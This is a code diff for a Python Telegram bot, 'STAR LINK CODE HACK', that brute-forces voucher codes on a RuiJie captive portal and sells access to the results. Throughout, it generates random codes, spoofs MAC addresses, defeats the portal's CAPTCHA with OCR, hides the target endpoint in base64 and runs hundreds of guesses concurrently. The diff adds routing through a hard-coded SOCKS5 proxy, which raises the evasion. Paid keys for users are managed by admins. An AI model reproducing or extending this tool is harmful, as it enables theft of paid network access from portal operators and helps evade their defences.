@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 """
-STAR LINK CODE HACK — Professional Edition
+STAR LINK CODE HACK — Professional Edition (VPS Proxy)
 ============================================
 Production-grade RuiJie captive-portal voucher scanner.
+Uses VPS's own public IP as SOCKS5 proxy via Dante.
 
 Author  : God-tier refactor
-Version : 2.1.0
+Version : 2.5.0 (VPS IP Proxy)
 """
 from __future__ import annotations
 
@@ -30,6 +31,7 @@ import cv2
 import ddddocr
 import numpy as np
 from aiohttp import web
+from aiohttp_socks import ProxyConnector
 from telebot.async_telebot import AsyncTeleBot
 from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
 
@@ -47,17 +49,19 @@ WEB_PORT: int = int(
     or "8099"
 )
 
-MAX_CONCURRENT_SCANS: int = 40
+MAX_CONCURRENT_SCANS: int = 100
 CONCURRENCY: int = 1000
 BATCH_SIZE: int = 500
 KEY_RECHECK_INTERVAL: float = 600.0
 
 SUCCESS_FILE_TARGETS: Tuple[str, ...] = ADMINS
 
-# Optional outbound proxies (unused by default in this build)
-PROXY_LIST: List[str] = []
-_proxy_index = 0
-_proxy_lock = asyncio.Lock()
+# ============================================================
+# VPS PROXY CONFIGURATION
+# ============================================================
+PROXY_ENABLED: bool = True
+# VPS ရဲ့ Public IP ကို Proxy အနေနဲ့ သုံး
+VPS_PROXY: str = "socks5://15.135.92.58:1080"
 
 # ============================================================
 # LOGGING
@@ -74,11 +78,43 @@ def setup_logging() -> None:
 
 log = logging.getLogger("starlink")
 
+
+# ============================================================
+# PROXY CONNECTOR FACTORY
+# ============================================================
+def make_proxy_connector() -> Optional[ProxyConnector]:
+    """VPS SOCKS5 Proxy အတွက် Connector ဖန်တီးတယ်။"""
+    if not PROXY_ENABLED:
+        return None
+    try:
+        return ProxyConnector.from_url(VPS_PROXY, ssl=False)
+    except Exception as e:
+        log.warning("Failed to create proxy connector: %s", e)
+        return None
+
+
+def make_direct_connector() -> Optional[aiohttp.TCPConnector]:
+    """Proxy မပါဘဲ တိုက်ရိုက် ချိတ်ဆက်တဲ့ Connector။"""
+    return aiohttp.TCPConnector(
+        limit=20000, limit_per_host=10000, ttl_dns_cache=300, ssl=False,
+    )
+
+
+def get_connector():
+    """Proxy ရှိရင် Proxy Connector၊ မရှိရင် Direct Connector ပြန်ပေး။"""
+    if PROXY_ENABLED:
+        conn = make_proxy_connector()
+        if conn is not None:
+            return conn
+    return make_direct_connector()
+
+
 # ============================================================
 # DATABASE
 # ============================================================
 _db_conn: Optional[sqlite3.Connection] = None
 _db_lock = asyncio.Lock()
+
 
 def _get_conn() -> sqlite3.Connection:
     global _db_conn
@@ -107,15 +143,18 @@ def _get_conn() -> sqlite3.Connection:
         log.info("Database ready (%s)", DB_PATH)
     return _db_conn
 
+
 async def _db_run(fn, *args):
     async with _db_lock:
         return await asyncio.to_thread(fn, *args)
+
 
 def _sync_get_auth_list() -> Dict[str, Dict[str, Any]]:
     c = _get_conn().cursor()
     c.execute("SELECT * FROM auth_list")
     return {r["user_id"]: {"expires_at": r["expires_at"], "plan": r["plan"]}
             for r in c.fetchall()}
+
 
 def _sync_upsert_key(user_id: str, expires_at: str, plan: str) -> None:
     conn = _get_conn()
@@ -125,24 +164,30 @@ def _sync_upsert_key(user_id: str, expires_at: str, plan: str) -> None:
     )
     conn.commit()
 
+
 def _sync_delete_key(user_id: str) -> None:
     conn = _get_conn()
     conn.execute("DELETE FROM auth_list WHERE user_id = ?", (user_id,))
     conn.commit()
 
+
 async def db_get_auth_list() -> Dict[str, Dict[str, Any]]:
     return await _db_run(_sync_get_auth_list)
+
 
 async def db_upsert_key(user_id: str, expires_at: str, plan: str) -> None:
     await _db_run(_sync_upsert_key, user_id, expires_at, plan)
 
+
 async def db_delete_key(user_id: str) -> None:
     await _db_run(_sync_delete_key, user_id)
+
 
 def _sync_get_results(user_id: str) -> List[str]:
     c = _get_conn().cursor()
     c.execute("SELECT code FROM results WHERE user_id = ? ORDER BY rowid ASC", (user_id,))
     return [r["code"] for r in c.fetchall()]
+
 
 def _sync_add_result(user_id: str, code: str, plan: str = "") -> None:
     conn = _get_conn()
@@ -151,6 +196,7 @@ def _sync_add_result(user_id: str, code: str, plan: str = "") -> None:
         (user_id, code, plan),
     )
     conn.commit()
+
 
 def _sync_set_results(user_id: str, codes: List[str]) -> None:
     conn = _get_conn()
@@ -162,14 +208,18 @@ def _sync_set_results(user_id: str, codes: List[str]) -> None:
         )
     conn.commit()
 
+
 async def db_get_results(user_id: str) -> List[str]:
     return await _db_run(_sync_get_results, user_id)
+
 
 async def db_add_result(user_id: str, code: str, plan: str = "") -> None:
     await _db_run(_sync_add_result, user_id, code, plan)
 
+
 async def db_set_results(user_id: str, codes: List[str]) -> None:
     await _db_run(_sync_set_results, user_id, codes)
+
 
 # ============================================================
 # GLOBAL STATE
@@ -193,6 +243,7 @@ _start_time: float = time.monotonic()
 session: Optional[aiohttp.ClientSession] = None
 _connector: Optional[aiohttp.TCPConnector] = None
 
+
 # ============================================================
 # SEMAPHORE / SCAN-SLOT
 # ============================================================
@@ -204,6 +255,7 @@ async def get_voucher_sem() -> asyncio.Semaphore:
                 _voucher_sem = asyncio.Semaphore(CONCURRENCY)
     return _voucher_sem
 
+
 async def acquire_scan_slot() -> bool:
     global active_scans_count
     async with active_scans_lock:
@@ -212,10 +264,12 @@ async def acquire_scan_slot() -> bool:
         active_scans_count += 1
         return True
 
+
 async def release_scan_slot() -> None:
     global active_scans_count
     async with active_scans_lock:
         active_scans_count = max(0, active_scans_count - 1)
+
 
 def cleanup_scan_state(chat_id: int) -> None:
     scan_tasks.pop(chat_id, None)
@@ -226,11 +280,13 @@ def cleanup_scan_state(chat_id: int) -> None:
     if chat_id in user_data:
         user_data[chat_id].pop("current_display_codes", None)
 
+
 # ============================================================
 # HELPERS
 # ============================================================
 def is_admin(user_id: int | str) -> bool:
     return str(user_id) in ADMINS
+
 
 def check_key_expiration(data: Any) -> bool:
     try:
@@ -244,6 +300,7 @@ def check_key_expiration(data: Any) -> bool:
     except Exception as e:
         log.warning("Key parse error: %s", e)
         return False
+
 
 def generate_expiry(plan: str) -> Optional[str]:
     now = datetime.now(timezone.utc)
@@ -262,13 +319,16 @@ def generate_expiry(plan: str) -> Optional[str]:
         return "9999-12-31T23:59:59Z"
     return (now + table[plan]).isoformat()
 
+
 def get_mac() -> str:
     first = random.choice([0x02, 0x06, 0x0A, 0x0E])
     mac = [first] + [random.randint(0, 0xFF) for _ in range(5)]
     return ":".join(f"{x:02x}" for x in mac)
 
+
 def replace_mac(url: str, new_mac: str) -> str:
     return re.sub(r"(?<=mac=)[^&]+", new_mac, url)
+
 
 def minute_to_hour(total_minutes: Any) -> str:
     if total_minutes in (None, "Unknown", "unknown"):
@@ -286,10 +346,12 @@ def minute_to_hour(total_minutes: Any) -> str:
     except Exception:
         return "Unknown"
 
+
 # ============================================================
 # BOT SETUP
 # ============================================================
 bot = AsyncTeleBot(BOT_TOKEN)
+
 
 # ============================================================
 # KEYBOARDS
@@ -298,13 +360,14 @@ def get_main_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(
         InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
-        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
-        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
+        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
+        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
         InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
         InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
         InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
     )
     return kb
+
 
 def get_voucher_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=2)
@@ -323,6 +386,7 @@ def get_voucher_keyboard() -> InlineKeyboardMarkup:
     )
     return kb
 
+
 def get_digit_keyboard(mode: str) -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=5)
     btns = [InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}") for i in range(10)]
@@ -330,6 +394,7 @@ def get_digit_keyboard(mode: str) -> InlineKeyboardMarkup:
     kb.add(InlineKeyboardButton("🎲 Random", callback_data=f"digit_{mode}_random"))
     kb.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
     return kb
+
 
 def get_start_scam_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=1)
@@ -339,6 +404,7 @@ def get_start_scam_keyboard() -> InlineKeyboardMarkup:
     )
     return kb
 
+
 def get_paid_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=1)
     kb.add(
@@ -347,10 +413,12 @@ def get_paid_keyboard() -> InlineKeyboardMarkup:
     )
     return kb
 
+
 def get_back_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=1)
     kb.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
     return kb
+
 
 def get_scam_button_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=1)
@@ -359,6 +427,7 @@ def get_scam_button_keyboard() -> InlineKeyboardMarkup:
         InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
     )
     return kb
+
 
 # ============================================================
 # STATE LOADER
@@ -379,6 +448,7 @@ async def load_paid_users() -> None:
             continue
     log.info("Preloaded %d paid users", len(paid_users))
 
+
 async def is_paid(user_id: str) -> bool:
     if is_admin(user_id):
         return True
@@ -391,8 +461,9 @@ async def is_paid(user_id: str) -> bool:
         return False
     return False
 
+
 # ============================================================
-# MESSAGE EDIT HELPERS (centralized — prevents arg-order bugs)
+# MESSAGE EDIT HELPERS
 # ============================================================
 async def safe_edit_text(chat_id: int, message_id: int, text: str,
                          reply_markup: Optional[InlineKeyboardMarkup] = None) -> bool:
@@ -408,6 +479,7 @@ async def safe_edit_text(chat_id: int, message_id: int, text: str,
         log.debug("edit_message_text failed: %s", e)
         return False
 
+
 async def safe_send(chat_id: int, text: str,
                     reply_markup: Optional[InlineKeyboardMarkup] = None,
                     parse_mode: Optional[str] = None) -> bool:
@@ -422,6 +494,7 @@ async def safe_send(chat_id: int, text: str,
     except Exception as e:
         log.debug("send_message failed: %s", e)
         return False
+
 
 # ============================================================
 # COMMAND HANDLERS
@@ -456,6 +529,7 @@ async def cmd_start(message):
         )
     await safe_send(chat_id, welcome, reply_markup=get_main_keyboard())
 
+
 @bot.message_handler(commands=["sendall"])
 async def cmd_sendall(message):
     if not is_admin(message.chat.id):
@@ -475,6 +549,7 @@ async def cmd_sendall(message):
         except Exception:
             failed += 1
     await bot.reply_to(message, f"✅ Sent: {sent} | ❌ Failed: {failed}")
+
 
 @bot.message_handler(commands=["key"])
 async def cmd_key(message):
@@ -510,6 +585,7 @@ async def cmd_key(message):
             f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
         )
 
+
 @bot.message_handler(commands=["genkey"])
 async def cmd_genkey(message):
     if not is_admin(message.chat.id):
@@ -536,6 +612,7 @@ async def cmd_genkey(message):
     )
     log.info("genkey %s plan=%s by admin %s", user_id, plan, message.chat.id)
 
+
 @bot.message_handler(commands=["delkey"])
 async def cmd_delkey(message):
     if not is_admin(message.chat.id):
@@ -555,6 +632,7 @@ async def cmd_delkey(message):
     if user_id.isdigit():
         user_data.pop(int(user_id), None)
     await bot.reply_to(message, f"✅ Key Deleted\nUSER ID : {user_id}")
+
 
 @bot.message_handler(commands=["listkeys"])
 async def cmd_listkeys(message):
@@ -591,7 +669,8 @@ async def cmd_listkeys(message):
         await bot.reply_to(message, text)
     else:
         for i in range(0, len(text), 4096):
-            await bot.send_message(message.chat.id, text[i : i + 4096])
+            await bot.send_message(message.chat.id, text[i: i + 4096])
+
 
 @bot.message_handler(commands=["result"])
 async def cmd_result(message):
@@ -612,7 +691,8 @@ async def cmd_result(message):
         await bot.reply_to(message, body)
     else:
         for i in range(0, len(body), 4096):
-            await bot.send_message(message.chat.id, body[i : i + 4096])
+            await bot.send_message(message.chat.id, body[i: i + 4096])
+
 
 @bot.message_handler(commands=["portal"])
 async def cmd_portal(message):
@@ -655,6 +735,7 @@ async def cmd_portal(message):
             parse_mode="Markdown",
         )
 
+
 @bot.message_handler(commands=["scan"])
 async def cmd_scan(message):
     args = message.text.split(maxsplit=1)
@@ -669,11 +750,11 @@ async def cmd_scan(message):
     mode = args[1].strip()
     await _start_scan(message.chat.id, mode, message=message)
 
+
 async def _start_scan(chat_id: int, mode: str, message=None,
                       user_name: Optional[str] = None) -> bool:
     user_id = str(chat_id)
 
-    # --- auth ---
     if not await is_paid(user_id):
         await safe_send(
             chat_id,
@@ -682,18 +763,15 @@ async def _start_scan(chat_id: int, mode: str, message=None,
         )
         return False
 
-    # --- session ---
     if chat_id not in user_data or "session_url" not in user_data[chat_id]:
         await safe_send(chat_id, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်ပါ။")
         return False
 
-    # --- duplicate scan ---
     existing = scan_tasks.get(chat_id)
     if existing and not existing["task"].done():
         await safe_send(chat_id, "Scan သည် အလုပ်လုပ်နေပြီ။ STOP SCAM ဖြင့် ရပ်နိုင်ပါသည်။")
         return False
 
-    # --- validate mode early (before consuming slot) ---
     try:
         test_iter = iter_codes(mode, start_digit=None)
         try:
@@ -704,11 +782,10 @@ async def _start_scan(chat_id: int, mode: str, message=None,
         await safe_send(chat_id, str(e))
         return False
 
-    # --- acquire slot ---
     if not await acquire_scan_slot():
         await safe_send(
             chat_id,
-            f"⚠️ Bot အလုပ်များနေပါသည် ({active_scans_count}/{MAX_CONCURRENT_SCANS})။ ခခဏစောင့်ပါ။",
+            f"⚠️ Bot အလုပ်များနေပါသည် ({active_scans_count}/{MAX_CONCURRENT_SCANS})။ ခဏစောင့်ပါ။",
         )
         return False
 
@@ -721,7 +798,6 @@ async def _start_scan(chat_id: int, mode: str, message=None,
 
     scan_id = str(uuid.uuid4())
 
-    # --- notify admins ---
     try:
         if user_name is None and message is not None:
             fu = getattr(message, "from_user", None)
@@ -760,6 +836,7 @@ async def _start_scan(chat_id: int, mode: str, message=None,
     scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
     return True
 
+
 @bot.message_handler(commands=["stop"])
 async def cmd_stop(message):
     chat_id = message.chat.id
@@ -774,6 +851,7 @@ async def cmd_stop(message):
     else:
         await bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=get_back_keyboard())
 
+
 @bot.message_handler(commands=["status"])
 async def cmd_status(message):
     if not is_admin(message.chat.id):
@@ -783,14 +861,17 @@ async def cmd_status(message):
     uptime = int(time.monotonic() - _start_time)
     h, rem = divmod(uptime, 3600)
     m, s = divmod(rem, 60)
+    proxy_status = "ENABLED" if PROXY_ENABLED else "DISABLED"
     await bot.reply_to(
         message,
         f"🪫 Bot Status\n\n"
         f"⏳ Uptime: {h}h {m}m {s}s\n"
         f"🔍 Active Scans: {active}/{MAX_CONCURRENT_SCANS}\n"
         f"🎫 Paid Users: {len(paid_users)}\n"
-        f"👥 Sessions: {len(user_data)}",
+        f"👥 Sessions: {len(user_data)}\n"
+        f"🌐 Proxy: {proxy_status} ({VPS_PROXY})",
     )
+
 
 @bot.message_handler(commands=["recheck"])
 async def cmd_recheck(message):
@@ -824,6 +905,7 @@ async def cmd_recheck(message):
     body = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ပြီး success code မတွေ့ပါ။"
     await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{body}")
     await db_set_results(user_id, recheck_list)
+
 
 # ============================================================
 # CALLBACK HANDLER
@@ -1058,23 +1140,27 @@ async def on_callback(call):
         except Exception:
             pass
 
+
 # ============================================================
 # CODE GENERATORS
 # ============================================================
 _LOWER = string.ascii_lowercase
 _LOWER_DIGIT = string.ascii_lowercase + string.digits
 
+
 def _rand_digits(n: int) -> str:
     return "".join(random.choices(string.digits, k=n))
+
 
 def _rand_lower(n: int) -> str:
     return "".join(random.choices(_LOWER, k=n))
 
+
 def _rand_mixed(n: int) -> str:
     return "".join(random.choices(_LOWER_DIGIT, k=n))
 
+
 def iter_codes(mode: str, start_digit: Optional[str] = None) -> Iterator[str]:
-    """Streaming generator — no huge lists in RAM."""
     if mode in ("6", "7", "8", "9"):
         length = int(mode)
         if length == 9:
@@ -1111,6 +1197,7 @@ def iter_codes(mode: str, start_digit: Optional[str] = None) -> Iterator[str]:
 
     raise ValueError(f"Unsupported scan mode: {mode}")
 
+
 # ============================================================
 # PROGRESS FORMAT
 # ============================================================
@@ -1137,6 +1224,7 @@ def format_progress(checked: int, total: Optional[int], speed: float, found: int
         "📊 Status : running\n"
     )
 
+
 # ============================================================
 # SESSION / MAC
 # ============================================================
@@ -1144,6 +1232,7 @@ _UA_HTML = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0"
 )
+
 
 async def get_session_id(sess: aiohttp.ClientSession, session_url: str,
                          previous_session_id: Optional[str] = None) -> Optional[str]:
@@ -1164,6 +1253,7 @@ async def get_session_id(sess: aiohttp.ClientSession, session_url: str,
         log.debug("get_session_id failed: %s", e)
         return previous_session_id
 
+
 # ============================================================
 # CAPTCHA
 # ============================================================
@@ -1180,6 +1270,7 @@ async def Captcha_Image(sess: aiohttp.ClientSession, session_id: str) -> bytes:
         params=params, headers=headers,
     ) as req:
         return await req.read()
+
 
 async def Varify_Captcha(sess: aiohttp.ClientSession, session_id: str, text: str) -> Optional[str]:
     headers = {
@@ -1202,7 +1293,9 @@ async def Varify_Captcha(sess: aiohttp.ClientSession, session_id: str, text: str
         log.debug("captcha verify failed: %s", e)
         return None
 
+
 _ocr = ddddocr.DdddOcr(show_ad=False)
+
 
 def _ocr_sync(image_bytes: bytes) -> Optional[str]:
     nparr = np.frombuffer(image_bytes, np.uint8)
@@ -1219,12 +1312,14 @@ def _ocr_sync(image_bytes: bytes) -> Optional[str]:
         log.debug("ocr error: %s", e)
         return None
 
+
 async def Captcha_Text(image_bytes: bytes) -> Optional[str]:
     try:
         return await asyncio.to_thread(_ocr_sync, image_bytes)
     except Exception as e:
         log.debug("captcha_text error: %s", e)
         return None
+
 
 # ============================================================
 # VOUCHER BALANCE
@@ -1245,8 +1340,9 @@ async def Code_Expires_Date(active_id: str) -> Tuple[str, Any]:
     }
     timeout = aiohttp.ClientTimeout(total=10)
     try:
+        connector = get_connector()
         async with aiohttp.ClientSession(
-            connector=_connector, connector_owner=False,
+            connector=connector, connector_owner=True,
             cookie_jar=aiohttp.CookieJar(), timeout=timeout,
         ) as s:
             for url in paths:
@@ -1269,12 +1365,14 @@ async def Code_Expires_Date(active_id: str) -> Tuple[str, Any]:
         log.debug("Code_Expires_Date outer error: %s", e)
     return "📋 Plan: Unknown | ⏳ Time: Unknown", "Unknown"
 
+
 # ============================================================
 # PERFORM CHECK
 # ============================================================
 _POST_URL = base64.b64decode(
     b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
 ).decode()
+
 
 async def perform_check(session_url: str, code: str, chat_id: int,
                         scan_id: Optional[str] = None, recheck: bool = False,
@@ -1301,8 +1399,9 @@ async def perform_check(session_url: str, code: str, chat_id: int,
     for attempt in range(3):
         timeout = aiohttp.ClientTimeout(total=30)
         try:
+            connector = get_connector()
             async with aiohttp.ClientSession(
-                connector=_connector, connector_owner=False,
+                connector=connector, connector_owner=True,
                 cookie_jar=aiohttp.CookieJar(), timeout=timeout,
             ) as sess:
                 session_id = await get_session_id(sess, session_url, None)
@@ -1358,7 +1457,6 @@ async def perform_check(session_url: str, code: str, chat_id: int,
     if not response:
         return None
 
-    # --- SUCCESS ---
     if "logonUrl" in response:
         if recheck:
             return code
@@ -1395,7 +1493,6 @@ async def perform_check(session_url: str, code: str, chat_id: int,
             except Exception as e:
                 log.warning("success message error: %s", e)
 
-    # --- LIMITED (STA) ---
     elif "STA" in response:
         limited_texts.setdefault(chat_id, []).append(code)
         if message is not None:
@@ -1420,6 +1517,7 @@ async def perform_check(session_url: str, code: str, chat_id: int,
                 log.warning("limited message error: %s", e)
 
     return None
+
 
 # ============================================================
 # RUN BRUTEFORCE
@@ -1456,7 +1554,6 @@ async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str
             if not batch:
                 break
 
-            # Periodic key check
             if time.monotonic() - last_key_check >= KEY_RECHECK_INTERVAL:
                 if not await is_paid(str(chat_id)):
                     await safe_send(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
@@ -1473,7 +1570,6 @@ async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str
             await asyncio.gather(*(_check(c) for c in batch), return_exceptions=True)
             checked += len(batch)
 
-            # progress update
             found = len(success_texts.get(chat_id, []))
             elapsed = time.monotonic() - scan_start
             speed = (checked / elapsed * 60) if elapsed > 0 else 0
@@ -1488,7 +1584,6 @@ async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str
                     except Exception as e:
                         log.debug("progress send error: %s", e)
 
-        # Completed
         if progress_msg is not None:
             found = len(success_texts.get(chat_id, []))
             if total is not None:
@@ -1521,6 +1616,7 @@ async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str
         cleanup_scan_state(chat_id)
         await release_scan_slot()
 
+
 # ============================================================
 # SUCCESS FILE AUTO-SEND
 # ============================================================
@@ -1548,6 +1644,7 @@ async def _send_success_file(chat_id: int) -> None:
         except Exception:
             pass
 
+
 # ============================================================
 # PORTAL URL VALIDATION
 # ============================================================
@@ -1557,13 +1654,11 @@ async def check_session_url_improved(session_url: str, use_proxy: bool = False) 
         "accept-language": "en-US,en;q=0.9",
         "user-agent": _UA_HTML,
     }
-    proxy = None  # proxies disabled by default
     if session is None:
         return False
     try:
         async with session.get(
-            session_url, allow_redirects=True, headers=headers,
-            proxy=proxy, timeout=15,
+            session_url, allow_redirects=True, headers=headers, timeout=15,
         ) as resp:
             if resp.status >= 400:
                 return False
@@ -1592,14 +1687,17 @@ async def check_session_url_improved(session_url: str, use_proxy: bool = False) 
         log.debug("portal check error: %s", e)
         return False
 
+
 # ============================================================
 # WEB SERVER
 # ============================================================
 async def _web_root(_request):
     return web.Response(text="Bot is awake and running 24/7!")
 
+
 async def _web_health(_request):
     return web.json_response({"status": "ok", "uptime": int(time.monotonic() - _start_time)})
+
 
 async def web_server():
     app = web.Application()
@@ -1611,15 +1709,14 @@ async def web_server():
     await site.start()
     log.info("Web server listening on port %d", WEB_PORT)
 
+
 # ============================================================
-# POLLING (with proper timeouts)
+# POLLING
 # ============================================================
 async def start_polling():
     backoff = 5
     while True:
         try:
-            # timeout=30: Telegram long-poll window
-            # request_timeout=90: aiohttp must survive past Telegram's window
             await bot.infinity_polling(timeout=30, request_timeout=90)
             return
         except asyncio.CancelledError:
@@ -1632,6 +1729,7 @@ async def start_polling():
             log.exception("Polling error: %s. Reconnect in %ds", e, backoff)
             await asyncio.sleep(backoff)
             backoff = min(backoff * 2, 60)
+
 
 # ============================================================
 # LIFECYCLE
@@ -1662,14 +1760,15 @@ async def _on_shutdown():
             pass
     log.info("Shutdown complete.")
 
+
 async def main():
     setup_logging()
     log.info("Starting STAR LINK bot …")
+    log.info("VPS Proxy: %s (Enabled=%s)", VPS_PROXY, PROXY_ENABLED)
 
     _get_conn()
     await load_paid_users()
 
-    # verify token quickly
     try:
         me = await bot.get_me()
         log.info("Bot authorized as @%s (id=%s)", me.username, me.id)
@@ -1714,6 +1813,7 @@ async def main():
         except (asyncio.CancelledError, Exception):
             pass
         await _on_shutdown()
+
 
 if __name__ == "__main__":
     try:
